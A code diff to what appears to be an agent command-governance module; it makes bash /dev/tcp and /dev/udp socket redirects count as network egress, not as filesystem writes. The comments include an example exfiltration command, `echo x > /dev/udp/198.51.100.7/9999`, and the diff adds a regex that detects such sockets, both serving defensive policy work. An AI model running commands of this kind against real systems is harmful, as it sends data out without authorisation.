@@ -362,11 +362,34 @@ function writeTargetsFromInvocation(tool: string, args: string[]): string[] {
 // share the prefix (`/dev/shm/payload`, `/devops/deploy.sh`) stay governed.
 //
 // Deliberately NOT extended to /dev/tcp/* or /dev/udp/*: those are sockets, and
-// a write to one is real egress that must stay denied.
+// a write to one is real egress that must stay denied. They are excluded from
+// write targets separately, by SOCKET_TARGET below, so that they are denied as
+// EGRESS rather than as a filesystem write.
 const DISCARD_TARGET = /^\/dev\/(?:null|stdout|stderr|fd\/\d+)$/;
+
+/**
+ * Bash's raw-socket pseudo-paths. Shaped like a file, and not one.
+ *
+ * `echo x > /dev/udp/198.51.100.7/9999` opens a UDP socket; nothing is written
+ * to any filesystem. Counting it as a write target got the VERDICT right and
+ * the REASON wrong: it resolves outside every write root, so
+ * `file-write-outside-workspace` matched first and the operator was told a
+ * network exfiltration was a stray file write. The destination is already
+ * extracted as a host by `extractHosts`, so removing it here does not weaken
+ * the denial — it moves it to the rule that describes what actually happened,
+ * and makes the command reviewable as the egress it is.
+ *
+ * Anchored on the host segment being present, so a bare `> /dev/tcp` (which
+ * opens nothing and is just an odd filename) stays governed as a write.
+ */
+const SOCKET_TARGET = /^\/dev\/(?:tcp|udp)\/[^/]+/;
 
 function isDiscardedStream(target: string): boolean {
   return DISCARD_TARGET.test(target.replace(/^['"]+/, "").replace(/['"]+$/, ""));
+}
+
+function isRawSocket(target: string): boolean {
+  return SOCKET_TARGET.test(target.replace(/^['"]+/, "").replace(/['"]+$/, ""));
 }
 
 /** Every write-shaped target in a command: shell redirects plus write-tool arguments. */
@@ -383,8 +406,9 @@ function writeTargets(command: string): string[] {
     if (!invocation) continue;
     targets.push(...writeTargetsFromInvocation(invocation.tool, invocation.args));
   }
-  // Applied to both sources: `tee /dev/null` discards just as a redirect does.
-  return targets.filter((target) => !isDiscardedStream(target));
+  // Applied to both sources: `tee /dev/null` discards just as a redirect does,
+  // and `tee /dev/udp/host/port` is egress just as a redirect to one is.
+  return targets.filter((target) => !isDiscardedStream(target) && !isRawSocket(target));
 }
 
 /**
